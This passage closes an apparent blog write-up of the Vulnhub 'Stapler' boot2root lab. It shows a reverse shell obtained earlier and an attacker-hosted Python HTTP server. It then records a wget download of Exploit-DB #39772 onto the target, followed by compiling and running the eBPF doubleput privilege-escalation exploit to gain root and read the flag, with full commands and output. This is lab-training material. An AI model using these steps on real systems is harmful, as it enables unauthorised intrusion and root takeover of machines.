+<p>Let's see if it works, by viewing the terminal with running listener. </p>
+
+<p><img src="/img/stapler/php-reverse-4.png" alt="php-reverse-4" class="img-responsive" /></p>
+
+<p>YES, it works! We've got the shell ready to perform last step - privilage escalation. After looking in exploit-db I have found the script that will allow us to perform this operation - <a href="https://www.exploit-db.com/exploits/39772/">Exploit-db #39772 </a>. We can't download it in our shell session but what we can do is to download it using OS we're using, setup simple HTTP server and then download it to our stapler machine. Start simple HTTP server in the folder where you downloaded the .zip package, you can do this using this python command: </p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">python -m SimpleHTTPServer 80</code></pre></figure>
+
+<p>Then download it using the wget tool.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">$ </span>wget http://10.0.2.5/39772.zip
+--2016-09-11 13:25:04--  http://10.0.2.5/39772.zip
+Connecting to 10.0.2.5:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7025 <span class="o">(</span>6.9K<span class="o">)</span> <span class="o">[</span>application/zip]
+39772.zip: Permission denied
+
+Cannot write to <span class="s1">'39772.zip'</span> <span class="o">(</span>Success<span class="o">)</span>.
+<span class="gp">$ </span>ls
+bin
+boot
+dev
+etc
+home
+initrd.img.old
+lib
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+vmlinuz.old
+<span class="gp">$ </span><span class="nb">cd </span>home     
+<span class="gp">$ </span>ls
+AParnell
+CCeaser
+CJoo
+DSwanger
+Drew
+ETollefson
+Eeth
+IChadwick
+JBare
+JKanode
+JLipps
+LSolum
+LSolum2
+MBassin
+MFrei
+NATHAN
+RNunemaker
+SHAY
+SHayslett
+SStroud
+Sam
+Taylor
+elly
+jamie
+jess
+kai
+mel
+peter
+www
+zoe
+<span class="gp">$ </span><span class="nb">cd </span>www
+<span class="gp">$ </span>ls
+<span class="gp">$ </span>wget http://10.0.2.5/39772.zip
+--2016-09-11 13:26:19--  http://10.0.2.5/39772.zip
+Connecting to 10.0.2.5:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7025 <span class="o">(</span>6.9K<span class="o">)</span> <span class="o">[</span>application/zip]
+Saving to: <span class="s1">'39772.zip'</span>
+
+     0K ......                                                100%  <span class="nv">243M</span><span class="o">=</span>0s
+
+2016-09-11 13:26:19 <span class="o">(</span>243 MB/s<span class="o">)</span> - <span class="s1">'39772.zip'</span> saved <span class="o">[</span>7025/7025]</code></pre></figure>
+
+<p>I had to move to the folder where I had privilages to write the file. Then we just have to proceed with the instructions of this exploit. </p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">$ </span>ls
+39772.zip
+<span class="gp">$ </span>unzip 39772.zip
+Archive:  39772.zip
+   creating: 39772/
+  inflating: 39772/.DS_Store         
+   creating: __MACOSX/
+   creating: __MACOSX/39772/
+  inflating: __MACOSX/39772/._.DS_Store  
+  inflating: 39772/crasher.tar       
+  inflating: __MACOSX/39772/._crasher.tar  
+  inflating: 39772/exploit.tar       
+  inflating: __MACOSX/39772/._exploit.tar  
+<span class="gp">$ </span>ls
+39772
+39772.zip
+__MACOSX
+<span class="gp">$ </span><span class="nb">cd </span>39772
+<span class="gp">$ </span>ls                
+crasher.tar
+exploit.tar
+<span class="gp">$ </span>tar xf exploit.tar
+<span class="gp">$ </span>ls
+crasher.tar
+ebpf_mapfd_doubleput_exploit
+exploit.tar
+<span class="gp">$ </span><span class="nb">cd </span>ebpf_mapfd_doubleput_exploit
+<span class="gp">$ </span>ls
+compile.sh
+doubleput.c
+hello.c
+suidhelper.c
+<span class="gp">$ </span>./compile.sh
+doubleput.c: In <span class="k">function</span> <span class="s1">'make_setuid'</span>:
+doubleput.c:91:13: warning: cast from pointer to integer of different size <span class="o">[</span>-Wpointer-to-int-cast]
+    .insns <span class="o">=</span> <span class="o">(</span>__aligned_u64<span class="o">)</span> insns,
+             ^
+doubleput.c:92:15: warning: cast from pointer to integer of different size <span class="o">[</span>-Wpointer-to-int-cast]
+    .license <span class="o">=</span> <span class="o">(</span>__aligned_u64<span class="o">)</span><span class="s2">""</span>
+               ^
+<span class="gp">$ </span>./doubleput</code></pre></figure>
+
+<p>Will it work or not? </p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">starting writev
+woohoo, got pointer reuse
+writev returned successfully. <span class="k">if </span>this worked, youll have a root shell <span class="k">in</span> &lt;<span class="o">=</span>60 seconds.
+suid file detected, launching rootshell...
+we have root privs now...
+whoami
+root
+<span class="nb">cd</span> /root
+ls
+fix-wordpress.sh
+flag.txt
+issue
+python.sh
+wordpress.sql
+cat flag.txt
+~~~~~~~~~~&lt;<span class="o">(</span>Congratulations<span class="o">)</span>&gt;~~~~~~~~~~
+                            .--.
+                          | ----- |
+                          |-.....-|
+                          |       |
+                          |       |
+         _,._             |       |
+    __.o   o-.            |       |
+ .-O o -.o   O <span class="o">)</span>_,._      |       |
+<span class="o">(</span> o   O  o <span class="o">)</span>--.-O   o-.-----
+ --------  <span class="o">(</span>   o  O    o<span class="o">)</span>  
+              ----------
+b6b545dc11b7a270f4bad23432190c75162c4a2b</code></pre></figure>
+
+<p>And yes, we've done it! We have the root access! </p>
+
+<p>It was great challenge, thanks <a href="https://www.vulnhub.com/author/g0tmi1k,21/">G0tim1k</a> for creating this boot2root machine. I hope you had as much fun reading this as I had thinking about the ways to gain root access and finish this challenge. Stay in touch for more machines from Vulnhub.com! </p>
+
+<p>~ Stay safe! </p>
+
+
+                <hr>
+
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/2016/09/10/coding-challenges-1/" data-toggle="tooltip" data-placement="top" title="Three Coding Challenges">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/2016/09/25/wireless-security-wep/" data-toggle="tooltip" data-placement="top" title="Wireless Security">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+            </div>
+        </div>
+    </div>
+</article>
+
+<hr>
+
+
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                    <li>
+                        <a href="/feed.xml">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    <li>
+                        <a href="https://github.com/w3ndige">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li>
+                        <a href="mailto:w3ndige@protonmail.com">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+                <p class="copyright text-muted">Copyright &copy; RootNetSec 2016 - 2017</p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js "></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js "></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/clean-blog.min.js "></script>
+
+
+</body>
+
+</html>
